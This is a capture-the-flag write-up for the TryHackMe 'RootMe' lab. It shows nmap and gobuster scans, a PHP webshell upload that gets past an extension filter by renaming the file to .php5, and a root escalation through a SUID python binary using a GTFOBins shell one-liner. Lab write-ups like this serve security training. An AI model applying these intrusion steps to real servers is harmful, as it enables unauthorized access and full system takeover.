# TRYHACKME : Rootme

## RECONNAISSANCE
### NMAP
```
$ nmap -sVC 10.10.60.63     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 02:15 CST
Nmap scan report for 10.10.60.63
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### GOBUSTER
```
/panel                (Status: 301) [Size: 310] [--> http://10.10.60.63/panel/]
/server-status        (Status: 403) [Size: 276]
/uploads              (Status: 301) [Size: 310] [--> http://10.10.60.63/uploads/]
```

The panel site gives us an upload page. This means webshell upload!

## GETTING A SHELL
Prepare your php webshell file. You can use the existing ones from kali linux.

I doesn't allow a `.php` file. Let's try tweaking it by renaming the webshell's file extention into `.png`

It finally accepts the file after resubmitting!

Start your netcat listener.

From previous gobuster, the `/uploads` is definitely storing uploads.

The shell won't load. Let's try renaming the extension into another php extension. I renamed it into `.php5`

Let's head again to the upload files.

It worked!

Finally let's retrieve the flag from `user.txt`.

## PRIVILEGE ESCALATION

The room gave us a clue of finding the SUID permission. `find / -user root -perm /4000`

The most suspicious file would be the python one. 

Search at the GTFOBins about python suid:
```
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Use the following command and retrieve the flag from `/root/root.txt`
